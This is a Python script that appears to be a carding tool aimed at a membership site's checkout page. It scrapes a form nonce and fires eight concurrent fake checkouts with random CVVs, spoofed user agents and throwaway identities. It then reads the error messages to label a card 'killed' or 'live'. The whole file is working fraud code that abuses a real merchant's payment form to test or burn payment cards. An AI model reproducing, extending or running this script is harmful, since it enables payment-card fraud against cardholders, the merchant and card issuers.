import requests
import random
import string
import re
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

def generate_random_cvv(is_amex=False):
    length = 4 if is_amex else 3
    return ''.join(random.choices(string.digits, k=length)).zfill(length)

def generate_string(length):
    lower_case = string.ascii_lowercase
    digits = string.digits
    return ''.join(random.choices(lower_case + digits, k=length))

def check_card(card_info):
    cc = card_info['cc']
    mes = card_info['month']
    ano = card_info['year']
    original_cvv = card_info['cvv']
    
    try:
        is_amex = len(cc) == 15
        
        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36'
        ]
        
        agent = random.choice(user_agents)
        
        kill_patterns = [
            'suspicious activity',
            'security code',
            'cvv',
            'cvc',
            'verification code',
            'invalid security',
            'incorrect security',
            'security number',
            'card code',
            'fraud',
            'blocked',
            'restricted'
        ]
        
        killed = False
        declined_count = 0
        
        def check_cvv(cvv_num):
            session = requests.Session()
            cvv = generate_random_cvv(is_amex)
            generate = generate_string(5)
            
            headers = {
                "authority": "bli-us.com",
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
                "accept-language": "en-IN,en;q=0.9",
                "cache-control": "no-cache",
                "user-agent": agent
            }
            
            try:
                response = session.get("https://bli-us.com/membership-account/membership-checkout/?level=78", headers=headers, timeout=30)
                
                nonce_match = re.search(r'name="pmpro_checkout_nonce"\s+value="([^"]+)"', response.text)
                if not nonce_match:
                    return False, False
                
                nonce = nonce_match.group(1)
                
                headers.update({
                    "content-type": "application/x-www-form-urlencoded",
                    "origin": "https://bli-us.com",
                    "referer": "https://bli-us.com/membership-account/membership-checkout/?level=78"
                })
                
                data = {
                    "pmpro_level": "78",
                    "checkjavascript": "1",
                    "pmpro_other_discount_code": "",
                    "username": f"Laka{generate}",
                    "password": "Lakalama@777",
                    "password2": "Lakalama@777",
                    "bemail": f"laka{generate}@gmail.com",
                    "bconfirmemail": f"laka{generate}@gmail.com",
                    "fullname": "",
                    "bfirstname": "Laka",
                    "blastname": "Lama",
                    "baddress1": "New York",
                    "baddress2": "",
                    "bcity": "New York",
                    "bstate": "New York",
                    "bzipcode": "10080",
                    "bcountry": "US",
                    "bphone": "3158558989",
                    "CardType": "Visa",
                    "AccountNumber": cc,
                    "ExpirationMonth": mes,
                    "ExpirationYear": ano if len(ano) == 4 else f"20{ano}",
                    "CVV": cvv,
                    "pmpro_discount_code": "",
                    "pmpro_checkout_nonce": nonce.strip(),
                    "_wp_http_referer": "/membership-account/membership-checkout/?level=78",
                    "submit-checkout": "1",
                    "javascriptok": "1",
                }
                
                response = session.post(
                    "https://bli-us.com/membership-account/membership-checkout/?level=78", 
                    headers=headers, 
                    data=data,
                    timeout=30
                )
                
                status_match = re.search(r'pmpro_message\s+pmpro_error"[^>]*>([^<]+)</div>', response.text)
                if status_match:
                    status = status_match.group(1).strip()
                else:
                    status_match = re.search(r'class="pmpro_message[^"]*"[^>]*>([^<]+)</div>', response.text)
                    if status_match:
                        status = status_match.group(1).strip()
                    else:
                        status = "Unknown response"
                
                print(f"[DEBUG] CVV check {cvv_num} response: {status}")
                
                is_killed = any(pattern in status.lower() for pattern in kill_patterns)
                is_declined = 'declined' in status.lower()
                
                return is_killed, is_declined
                
            except Exception as e:
                print(f"[ERROR] CVV check error: {e}")
                return False, False
            finally:
                session.close()
        
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(check_cvv, i) for i in range(8)]
            
            for future in as_completed(futures):
                is_killed, is_declined = future.result()
                if is_killed:
                    killed = True
                if is_declined:
                    declined_count += 1
        
        if killed:
            return {
                'status': 'killed',
                'message': 'Card killed successfully 💀'
            }
        elif declined_count >= 6:
            return {
                'status': 'killed',
                'message': 'Card killed - Too many declines 💀'
            }
        else:
            return {
                'status': 'live',
                'message': 'Card still alive ✅'
            }
            
    except Exception as e:
        print(f"[ERROR] Kill card error: {e}")
        return {
            'status': 'error',
            'message': f'Error: {str(e)[:50]}'
        }
